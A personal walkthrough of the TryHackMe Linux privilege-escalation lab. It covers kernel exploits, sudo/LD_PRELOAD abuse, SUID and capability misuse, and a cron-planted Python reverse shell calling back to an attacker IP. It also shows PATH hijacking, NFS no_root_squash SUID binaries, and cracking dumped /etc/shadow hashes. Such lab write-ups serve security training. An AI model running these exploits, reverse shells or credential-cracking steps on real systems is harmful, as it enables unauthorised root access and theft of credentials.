# Linux Privilege Escalation

URL: https://tryhackme.com/room/linprivesc

Level: Medium

Date: 28 Jul 2023

- [Kernel exploits](#kernel-exploits)
- [Sudo](#sudo)
	- [LD_PRELOAD](#ld-preload)
- [SUID](#suid)
- [Capabilities](#capabilities)
- [Cron Jobs](#cron-jobs)
- [PATH](#path)
- [NFS](#nfs)
- [Capstone Challenge](#capstone-challenge)




## kernel exploits

Kernel version

```bash
$ uname -ar
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

Exploit-DB:

https://www.exploit-db.com/exploits/37292

We have `gcc`? yes

```bash
$ gcc
gcc: fatal error: no input files
compilation terminated.
$
```

```bash
$ cat > /tmp/exploit.c
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
..
..
..
```

```bash
$ cd /tmp
$ gcc exploit.c
$ ./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
#
```


## Sudo

```bash
$ sudo -l
Matching Defaults entries for karen on ip-10-10-169-190:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-169-190:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
$
```

```bash
$ sudo /usr/bin/less /etc/shadow
..
..
..
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
```

### ld-preload

If `sudo -l` shows:

```
env_keep+=LD_PRELOAD
```

we can leverage that function:

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```


## SUID

```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
..
..
..
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
..
..
```

Let's focus on `base64`:

https://gtfobins.github.io/gtfobins/base64/#suid

```bash
$ LFILE=/etc/shadow
$ base64 "$LFILE" | base64 --decode
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
```

Let's crack user2's hash:

```bash
joshua@kaligra:~$ hashcat -m 1800 '$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/' /usr/share/wordlists/rockyou.txt
..
..
$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:Password1
..
..
```



## Capabilities

```bash
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

```bash
`./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
```

```bash
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
```


## Cron Jobs

```bash
$ cat /etc/crontab
..
..
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py

```

```bash
joshua@kaligra:~$ nc -nlvp 4444
listening on [any] 4444 ...
```

```bash
$ cat > /tmp/test.py
#!/usr/bin/python3

import socket,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.100.14",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

pty.spawn("/bin/sh")
$ chmod +x /tmp/test.py
```

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.7.32] 47548
# id
id
uid=0(root) gid=0(root) groups=0(root)
#
```



## PATH

Looting for SUID binary:

```bash
$ find /home -type f -perm -04000 -ls 2>/dev/null
   256346     20 -rwsr-xr-x   1 root     root        16712 Jun 20  2021 /home/murdoch/test
```

It seems that "test" try to execute another binary (`thm`):

```bash
$ /home/murdoch/test
sh: 1: thm: not found
```

That binary is NOT found in our current PATH:

```bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Let's copy `/bin/bash` to `/tmp` and then *prepend* that PATH:

```bash
$ cp /bin/bash /tmp/thm
$ export PATH=/tmp:$PATH
```

Now if we run "test", `/tmp/thm` will be executed and we will get a root shell:

```bash
$ /home/murdoch/test
root@ip-10-10-198-224:/# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

## NFS

The critical element for this privilege escalation vector is the `no_root_squash` option you can see above. By default, NFS will change the root user to `nfsnobody` and strip any file from operating with root privileges. If the `no_root_squash` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

Check remotely what shares are available:

```bash
joshua@kaligra:~$ showmount -e 10.10.50.1
Export list for 10.10.50.1:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

On target machine, check configuration:

```bash
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

All 3 shares have the `no_root_squash` option.

Let's mount:

```bash
joshua@kaligra:~$ mkdir /tmp/nfs
joshua@kaligra:~$ sudo mount -t nfs -o rw 10.10.50.1:/home/ubuntu/sharedfolder /tmp/nfs
[sudo] password for joshua:
```

Let's compile a setuid binary:

```c
[sugo@junkie ~]$ cat shell.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
[sugo@junkie ~]$ gcc shell.c
```

Let's copy `a.out` to our target share:

```bash
root@kaligra:/home/joshua/Desktop# cp a.out /tmp/nfs/
root@kaligra:/home/joshua/Desktop# chmod +sx /tmp/nfs/a.out
```

Back to target machine, now we have:

```bash
$ hostname
ip-10-10-50-1
$ ls -l /home/ubuntu/sharedfolder
total 12
-rwsr-sr-x 1 root root 8464 Jul 29 07:01 a.out
```

Let's run:

```bash
$ ./a.out
root@ip-10-10-50-1:/home/ubuntu/sharedfolder# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

**NOTE**

If we get this error:

```bash
$ ./shell
./shell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./shell)
```

Probably GLIBC on our attacker machine is too new.

We need to compile C code with previous version:

```bash
# objdump -T ./a.out

./a.out:     file format elf64-x86-64

DYNAMIC SYMBOL TABLE:
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) system
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) __libc_start_main
0000000000000000  w   D  *UND*  0000000000000000              __gmon_start__
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) setgid
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) setuid
```

**NOTE 2**



If our shell will NOT run as root, probably we need to add `-p`

*Running programs with setuid is inherently insecure and when the shell executes the current UID is checked vs. the SUID and if they don't match the shell ignores the SUID and runs as the UID. Adding the `-p` tells the shell not to reset the UID to the current one.*

https://security.stackexchange.com/questions/263601/suid-binary-doesnt-work-tryhackme





## Capstone challenge

we gain initial access to target system as "leonard" user.

### sudo

```bash
[leonard@ip-10-10-111-57 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard:
Sorry, user leonard may not run sudo on ip-10-10-111-57.
[leonard@ip-10-10-111-57 ~]$
```

Nothing here.

### suid

```bash
[leonard@ip-10-10-111-57 ~]$ find / -type f -perm -04000 2>/dev/null

/usr/bin/base64
/usr/bin/ksu
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/newgrp
..
..
..
```

We try the "base64" path.

```bash
[leonard@ip-10-10-111-57 ~]$ base64 $LFILE | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

Let's copy both `/etc/passwd` and `/etc/shadow` to out attacker machine and then use `unshadow` tool:

```bash
unshadow passwd shadow > toCrack
```

Let's crack:

### John The Ripper

```bash
john ./toCrack --wordlist=/usr/share/wordlists/rockyou.txt
missy:Password1:1001:1001::/home/missy:/bin/bash
```

### missy user

We then switch to "missy" user.

### history

```bash
[missy@ip-10-10-111-57 ~]$ history
    1  ls
    2  cd missy/
    3  ls
    4  cd Do
    5  cd Documents
    6  ls
    7  cat flag1.txt
    8  su root
    9  quit
   10  sudo -l
   11  find . -exec /bin/sh \; -quit
   12  find -exec /bin/sh \; -quit
   13  sudo find /home -exec /bin/bash \;
   14  ls
   15  cd leonard/
   16  cd rootflag/
   17  su root
   18  ls
   19  history
```

### first flag

```bash
[missy@ip-10-10-111-57 ~]$ cat Documents/flag1.txt
THM-42828719920544
```

### privesc - sudo

```bash
[missy@ip-10-10-111-57 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-111-57:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-111-57:
    (ALL) NOPASSWD: /usr/bin/find
```

Let's assume that the name of second flag is `flag2.txt`:

```bash
[missy@ip-10-10-234-161 ~]$ sudo find /home -type f -name "flag2.txt"
/home/rootflag/flag2.txt

```

We then use same "base64" technique to get `flag2.txt`:

```bash
[missy@ip-10-10-4-33 ~]$ sudo /usr/bin/find / -type f -name "flag2.txt" 2>/dev/null
/home/rootflag/flag2.txt
[missy@ip-10-10-4-33 ~]$ ls -l  /home/rootflag/flag2.txt
ls: cannot access /home/rootflag/flag2.txt: Permission denied
[missy@ip-10-10-4-33 ~]$ LFILE="/home/rootflag/flag2.txt"
[missy@ip-10-10-4-33 ~]$ base64 "$LFILE" | base64 --decode
THM-168824782390238
[missy@ip-10-10-4-33 ~]$
```

Or to get a root shell:

```bash
[missy@ip-10-10-234-161 ~]$ sudo find . -exec /bin/sh \; -quit
sh-4.2#
sh-4.2#
sh-4.2#
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2#
```




